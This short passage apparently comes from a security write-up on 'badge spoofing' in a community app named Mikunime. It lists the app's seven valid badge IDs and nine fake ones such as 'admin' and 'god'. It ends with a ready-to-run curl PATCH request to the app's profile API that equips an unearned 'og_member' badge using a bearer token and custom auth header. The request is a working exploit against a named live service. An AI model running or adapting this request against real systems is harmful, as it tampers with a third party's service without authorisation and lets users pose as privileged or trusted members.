## 3. Badge Spoofing — All 7 Badges + Fake Badges

### Valid Badges (App Renders)
| Badge ID | Display Name |
|---|---|
| `creator` | Creator |
| `top_donator` | Top Donator |
| `og_member` | OG Member |
| `beta_tester` | Beta Tester |
| `supporter` | Special Supporter |
| `miku_rookie` | Miku Rookie |
| `miku_prem` | Miku Premium |

### Fake Badges (Persist but App Ignores)
- `owner`, `admin`, `moderator`, `vip`, `god`, `hacker`, `staff`, `legendary`, `premium_badge`

# EXECUTION TRACE — Badge Spoof
```bash
curl -X PATCH https://panel.mikunime.web.id/api/miku/7/9/me/profile \
  -H "Authorization: Bearer {token}" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"equippedBadge":"og_member"}'
```

